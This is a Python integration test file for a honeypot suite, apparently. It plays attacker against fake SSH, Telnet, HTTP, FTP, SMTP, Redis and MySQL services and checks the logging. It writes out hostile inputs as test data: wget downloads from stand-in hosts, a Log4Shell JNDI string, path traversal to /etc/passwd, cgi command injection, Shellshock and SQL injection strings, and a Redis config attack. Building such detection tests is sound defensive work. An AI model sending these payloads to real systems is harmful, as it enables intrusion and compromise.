"""Integration tests: start each honeypot on a free port and talk to it like an attacker."""
import asyncio
import json
import os
import socket
import struct
import sys
import tempfile

import asyncssh
import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "honeypots"))

from hn.common import EventLogger, Limiter  # noqa: E402
from hn.mail_ftp import FTPService, SMTPService  # noqa: E402
from hn.redis_mysql import MySQLService, RedisService  # noqa: E402
from hn.ssh import SSHService  # noqa: E402
from hn.tcp_catchall import TCPCatchAll  # noqa: E402
from hn.telnet import TelnetService  # noqa: E402
from hn.web import HTTPService, classify  # noqa: E402


def free_port():
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def events(logdir, service):
    p = os.path.join(logdir, f"{service}.jsonl")
    return [json.loads(x) for x in open(p)] if os.path.exists(p) else []


@pytest.fixture
def env_dirs(monkeypatch):
    with tempfile.TemporaryDirectory() as d:
        monkeypatch.setenv("HN_IDLE_TIMEOUT", "5")
        yield d


async def start(cls, name, d, **cfg):
    svc = cls(EventLogger(name, d, "test", echo=False), Limiter(), cfg)
    port = free_port()
    await svc.start("127.0.0.1", port)
    return svc, port


async def rw(port, payload=b"", read=4096, wait=0.3):
    r, w = await asyncio.open_connection("127.0.0.1", port)
    if payload:
        w.write(payload)
        await w.drain()
    await asyncio.sleep(wait)
    try:
        data = await asyncio.wait_for(r.read(read), 2)
    except asyncio.TimeoutError:
        data = b""
    w.close()
    return data


@pytest.mark.asyncio
async def test_ssh_login_and_commands(env_dirs):
    svc, port = await start(SSHService, "ssh", env_dirs, key_dir=os.path.join(env_dirs, "keys"))
    # first two attempts rejected, third accepted (HN_SSH_ACCEPT_AFTER=3)
    for pw in ("admin", "123456"):
        with pytest.raises(asyncssh.PermissionDenied):
            await asyncssh.connect("127.0.0.1", port, username="root", password=pw, known_hosts=None,
                                   preferred_auth="password", client_keys=None)
    async with asyncssh.connect("127.0.0.1", port, username="root", password="toor", known_hosts=None,
                                client_keys=None, preferred_auth="password") as c:
        r = await c.run("uname -a; wget http://1.2.3.4/x.sh -O /tmp/x.sh; id", check=False)
        assert "Linux" in r.stdout and "uid=0(root)" in r.stdout
    await svc.stop()
    ev = events(env_dirs, "ssh")
    auths = [e for e in ev if e["event"] == "auth"]
    assert [a["data"]["success"] for a in auths] == [False, False, True]
    assert auths[0]["data"]["password"] == "admin"
    assert any(e["event"] == "download_attempt" and e["data"]["url"] == "http://1.2.3.4/x.sh" for e in ev)
    assert any(e["event"] == "command" for e in ev)
    assert any(e["event"] == "login_success" for e in ev)
    # session id is consistent across a connection
    assert len({e["session"] for e in ev if e["event"] in ("connect", "disconnect")}) >= 1


@pytest.mark.asyncio
async def test_ssh_interactive_shell(env_dirs):
    os.environ["HN_SSH_ACCEPT_ANY"] = "1"
    try:
        svc, port = await start(SSHService, "ssh", env_dirs, key_dir=os.path.join(env_dirs, "keys"))
    finally:
        os.environ.pop("HN_SSH_ACCEPT_ANY")
    svc.accept_any = True
    async with asyncssh.connect("127.0.0.1", port, username="root", password="x", known_hosts=None,
                                client_keys=None) as c:
        proc = await c.create_process(term_type="xterm")
        await asyncio.sleep(0.3)
        proc.stdin.write("cat /etc/passwd\nexit\n")
        out = await asyncio.wait_for(proc.stdout.read(), 5)
        assert "root:x:0:0" in out
    await svc.stop()
    cmds = [e["data"]["command"] for e in events(env_dirs, "ssh") if e["event"] == "command"]
    assert "cat /etc/passwd" in cmds


@pytest.mark.asyncio
async def test_telnet(env_dirs):
    svc, port = await start(TelnetService, "telnet", env_dirs)
    r, w = await asyncio.open_connection("127.0.0.1", port)
    for u, p in (("root", "xc3511"), ("admin", "admin")):
        await asyncio.sleep(0.1)
        w.write(f"{u}\r\n".encode())
        await asyncio.sleep(0.1)
        w.write(f"{p}\r\n".encode())
    await asyncio.sleep(0.3)
    w.write(b"busybox MIRAI\r\n")
    w.write(b"cat /proc/cpuinfo\r\n")
    await asyncio.sleep(0.3)
    data = await asyncio.wait_for(r.read(8192), 2)
    w.close()
    assert b"MIRAI: applet not found" in data and b"Xeon" in data
    await svc.stop()
    ev = events(env_dirs, "telnet")
    assert [e["data"]["success"] for e in ev if e["event"] == "auth"] == [False, True]


@pytest.mark.asyncio
async def test_http_requests_and_tags(env_dirs):
    svc, port = await start(HTTPService, "http", env_dirs)
    body = b"log=admin&pwd=hunter2&wp-submit=Log+In"
    resp = await rw(port, b"POST /wp-login.php HTTP/1.1\r\nHost: x\r\nUser-Agent: sqlmap/1.5\r\n"
                          b"Content-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s"
                    % (len(body), body))
    assert resp.startswith(b"HTTP/1.1 200") and b"Invalid username" in resp
    await rw(port, b"GET /?x=${jndi:ldap://evil/a} HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
    await rw(port, b"GET /../../etc/passwd HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
    resp = await rw(port, b"GET /.env HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
    assert b"DECOY" in resp
    resp = await rw(port, b"\x16\x03\x01\x02\x00\x01\x00\x01\xfc\x03\x03")  # TLS hello on plain port
    await rw(port, b"GET /cgi-bin/x?a=$(wget http://9.9.9.9/z) HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
    await svc.stop()
    ev = events(env_dirs, "http")
    req = [e for e in ev if e["event"] == "request"]
    assert any(e["data"]["path"] == "/cgi-bin/x" and "cmd_injection" in e["data"]["tags"] for e in req)
    assert any("log4shell" in e["data"]["tags"] for e in req)
    assert any("path_traversal" in e["data"]["tags"] for e in req)
    assert any("scanner" in e["data"]["tags"] for e in req)
    auth = [e for e in ev if e["event"] == "auth"][0]["data"]
    assert (auth["username"], auth["password"]) == ("admin", "hunter2")
    assert any(e["event"] == "raw_request" and e["data"]["kind"] == "tls_clienthello_on_http" for e in ev)


def test_classify():
    assert "sqli" in classify("id=1 UNION SELECT 1,2")
    assert "cmd_injection" in classify("a=1;wget http://x/y")
    assert "shellshock" in classify("() { :; }; /bin/bash -c 'id'")
    assert classify("GET /index.html") == []


@pytest.mark.asyncio
async def test_ftp(env_dirs):
    svc, port = await start(FTPService, "ftp", env_dirs)
    r, w = await asyncio.open_connection("127.0.0.1", port)
    assert (await r.readline()).startswith(b"220")
    for cmd in (b"USER anonymous", b"PASS a@b.c", b"USER root", b"PASS toor", b"PWD", b"QUIT"):
        w.write(cmd + b"\r\n")
        await w.drain()
        await asyncio.wait_for(r.readline(), 2)
    w.close()
    await svc.stop()
    ev = events(env_dirs, "ftp")
    assert [e["data"]["success"] for e in ev if e["event"] == "auth"] == [False, True]


@pytest.mark.asyncio
async def test_smtp(env_dirs):
    svc, port = await start(SMTPService, "smtp", env_dirs)
    r, w = await asyncio.open_connection("127.0.0.1", port)
    await r.readline()
    import base64 as b
    lines = [b"EHLO x", b"AUTH LOGIN", b.b64encode(b"bob"), b.b64encode(b"pw123"),
             b"MAIL FROM:<a@b.c>", b"RCPT TO:<d@e.f>", b"DATA", b"Subject: hi\r\n\r\nbuy now\r\n.", b"QUIT"]
    for line in lines:
        w.write(line + b"\r\n")
        await w.drain()
        await asyncio.sleep(0.05)
    await asyncio.sleep(0.3)
    w.close()
    await svc.stop()
    ev = events(env_dirs, "smtp")
    a = [e for e in ev if e["event"] == "auth"][0]["data"]
    assert (a["username"], a["password"]) == ("bob", "pw123")
    m = [e for e in ev if e["event"] == "mail"][0]["data"]
    assert "buy now" in m["body"] and m["rcpt_to"] == ["<d@e.f>"]


@pytest.mark.asyncio
async def test_redis(env_dirs):
    svc, port = await start(RedisService, "redis", env_dirs)
    r, w = await asyncio.open_connection("127.0.0.1", port)
    w.write(b"*1\r\n$4\r\nPING\r\n")
    assert await r.readline() == b"+PONG\r\n"
    w.write(b"*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$10\r\n/root/.ssh\r\n")
    assert await r.readline() == b"+OK\r\n"
    w.write(b"INFO\r\n")  # inline command
    assert (await r.readline()).startswith(b"$")
    w.close()
    await svc.stop()
    ev = [e for e in events(env_dirs, "redis") if e["event"] == "command"]
    assert ev[1]["data"]["command"] == "config SET dir /root/.ssh"
    assert "redis_config" in ev[1]["data"]["tags"]


@pytest.mark.asyncio
async def test_mysql(env_dirs):
    svc, port = await start(MySQLService, "mysql", env_dirs)
    r, w = await asyncio.open_connection("127.0.0.1", port)
    hdr = await r.readexactly(4)
    greeting = await r.readexactly(int.from_bytes(hdr[:3], "little"))
    assert greeting[0] == 10 and b"5.7.38" in greeting
    caps = 0x0000A685 | 0x00080000  # secure connection + plugin auth
    scramble = bytes(range(20))
    body = (struct.pack("<IIB", caps, 1 << 24, 33) + b"\x00" * 23 + b"root\x00" + bytes([20]) + scramble
            + b"mysql_native_password\x00")
    w.write(struct.pack("<I", len(body))[:3] + b"\x01" + body)
    await w.drain()
    h = await r.readexactly(4)
    err = await r.readexactly(int.from_bytes(h[:3], "little"))
    assert err[0] == 0xFF and b"Access denied for user 'root'" in err
    w.close()
    await svc.stop()
    a = [e for e in events(env_dirs, "mysql") if e["event"] == "auth"][0]["data"]
    assert a["username"] == "root" and a["auth_response"] == scramble.hex() and len(a["salt"]) == 40


@pytest.mark.asyncio
async def test_tcp_catchall_and_limits(env_dirs):
    svc, port = await start(TCPCatchAll, "tcp", env_dirs)
    await rw(port, b"\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00")
    await svc.stop()
    p = [e for e in events(env_dirs, "tcp") if e["event"] == "payload"][0]["data"]
    assert p["protocol"] == "rdp_x224"


@pytest.mark.asyncio
async def test_per_ip_limit(env_dirs):
    svc = TCPCatchAll(EventLogger("tcp", env_dirs, "t", echo=False), Limiter(max_total=100, max_per_ip=2))
    port = free_port()
    await svc.start("127.0.0.1", port)
    conns = [await asyncio.open_connection("127.0.0.1", port) for _ in range(4)]
    await asyncio.sleep(0.5)
    for _, w in conns:
        w.close()
    await svc.stop()
    assert sum(1 for e in events(env_dirs, "tcp") if e["event"] == "limit_exceeded") == 2
